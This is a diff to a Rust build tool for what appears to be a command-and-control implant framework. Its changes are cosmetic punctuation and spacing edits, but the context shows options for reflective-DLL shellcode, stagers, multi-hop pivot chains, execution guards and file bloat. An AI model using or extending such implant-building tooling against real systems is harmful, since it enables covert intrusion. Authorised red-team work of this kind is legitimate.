@@ -81,17 +81,17 @@ struct Cli {
     ///
     /// Use this to pre-wire multi-hop chains at build time:
     ///
-    ///   hop1: no --auto-pivot-port  (operator starts listener manually)
+    ///   hop1: no --auto-pivot-port (operator starts listener manually)
     ///   hop2: --auto-pivot-port 5002
     ///   hop3: --auto-pivot-port 5003
-    ///   hop4: no --auto-pivot-port  (leaf node, no downstream)
+    ///   hop4: no --auto-pivot-port (leaf node, no downstream)
     ///
-    /// Omit (default) to disable — leaf nodes and direct-connect agents
+    /// Omit (default) to disable - leaf nodes and direct-connect agents
     /// do not need this flag.
     #[arg(long)]                           auto_pivot_port:   Option<u16>,
-    // ── Shellcode (sRDI-style reflective DLL → .bin) ──────────────────
+    // ── Shellcode (sRDI-style reflective DLL -> .bin) ──────────────────
     /// ROR13 hash of a DLL export to call after reflective load.
-    /// Accepts hex (0x…) or decimal. Default 0x10 = "no export call" —
+    /// Accepts hex (0x…) or decimal. Default 0x10 = "no export call" -
     /// correct for RCM agents, which start from DllMain.
     #[arg(long, default_value = "0x10", value_parser = parse_u32_auto)]
     sc_hash: u32,
@@ -134,10 +134,10 @@ enum Format { Exe, Dll, Service, Stager, Shellcode }
 enum ScOutput { Bin, B64, C, Hex }
 
 /// Find the cargo binary. Checks (in order):
-///   1. $CARGO_HOME/bin/cargo          — set in Docker image
-///   2. /usr/local/cargo/bin/cargo     — rust:latest default install path
-///   3. ~/.cargo/bin/cargo             — local user install
-///   4. `cargo` in $PATH               — last resort
+///   1. $CARGO_HOME/bin/cargo - set in Docker image
+///   2. /usr/local/cargo/bin/cargo - rust:latest default install path
+///   3. ~/.cargo/bin/cargo - local user install
+///   4. `cargo` in $PATH - last resort
 fn find_cargo() -> PathBuf {
     // 1. $CARGO_HOME
     if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
@@ -166,13 +166,13 @@ fn find_cargo() -> PathBuf {
     PathBuf::from("cargo")
 }
 
-/// Find the rustup binary. Mirrors find_cargo() — rustup lives alongside
+/// Find the rustup binary. Mirrors find_cargo() - rustup lives alongside
 /// cargo in the same bin directory.
 ///
 /// This is used for target verification. `cargo target list` is NOT a valid
 /// cargo subcommand; the correct tool is `rustup target list --installed`.
 fn find_rustup() -> PathBuf {
-    // 1. $CARGO_HOME/bin/rustup  (rustup installs itself here alongside cargo)
+    // 1. $CARGO_HOME/bin/rustup (rustup installs itself here alongside cargo)
     if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
         let p = PathBuf::from(&cargo_home).join("bin").join("rustup");
         if p.is_file() { return p; }
@@ -199,7 +199,7 @@ fn find_rustup() -> PathBuf {
     PathBuf::from("rustup")
 }
 
-/// Locate the project root — the directory containing Cargo.toml.
+/// Locate the project root - the directory containing Cargo.toml.
 /// Checks (in order):
 ///   1. Current working directory
 ///   2. Directory containing this binary
@@ -410,7 +410,7 @@ fn main() -> Result<()> {
         "guard_hour_end":    guard_hour_end,
         "guard_no_system":   cli.guard_no_system,
         // ── Pivot auto-cascade ────────────────────────────────────────
-        // null when not set — the agent's #[serde(default)] treats null
+        // null when not set - the agent's #[serde(default)] treats null
         // and missing identically, so existing builds are unaffected.
         "auto_pivot_port":   cli.auto_pivot_port,
     }).to_string();
@@ -430,7 +430,7 @@ fn main() -> Result<()> {
         "bloat_mb": cli.bloat
     }).to_string();
 
-    // Shellcode conversion wraps a Windows x64 DLL — reject other platforms
+    // Shellcode conversion wraps a Windows x64 DLL - reject other platforms
     // up front instead of after a 10-minute compile.
     if cli.format == Format::Shellcode && cli.platform != Platform::Windows {
         anyhow::bail!(
@@ -453,7 +453,7 @@ fn main() -> Result<()> {
 
     // Verify the target is installed before wasting time on compilation.
     //
-    // FIX: the original code called `cargo target list --installed`, but
+    // The original code called `cargo target list --installed`, but
     // "cargo target" is not a valid cargo subcommand. cargo exits with an
     // error, the output is empty, `installed` is always false, and the
     // bail fires even when the target IS installed.
@@ -579,7 +579,7 @@ fn main() -> Result<()> {
 
         println!("\n[+] Build Success!");
         // NOTE: the API job watcher harvests the artifact path from the
-        // "[+] Binary: " prefix — keep this exact line first.
+        // "[+] Binary: " prefix - keep this exact line first.
         println!("[+] Binary: {}", dest_path.display());
         println!("[+] Format:   {} ({:?} encoding)", format_name, cli.sc_output);
         println!("[+] Profile:  {}", final_profile.name);
